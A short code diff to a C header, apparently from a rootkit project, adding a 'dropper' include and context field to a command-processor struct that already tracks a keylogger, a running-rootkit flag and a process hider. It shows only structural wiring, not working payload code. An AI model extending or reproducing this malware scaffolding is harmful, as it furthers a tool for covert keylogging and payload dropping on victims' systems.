@@ -3,6 +3,7 @@
 
 #include <sys/types.h>
 #include "userspace/hider.h"
+#include "userspace/dropper.h"
 
 typedef struct {
     int tracked_pids_map_fd;
@@ -11,6 +12,7 @@ typedef struct {
     bool *keylogger_active;
     volatile bool *rootkit_running;
     hider_context_t *hider_ctx;
+    dropper_context_t dropper_ctx;
 } command_processor_context_t;
 
 /**
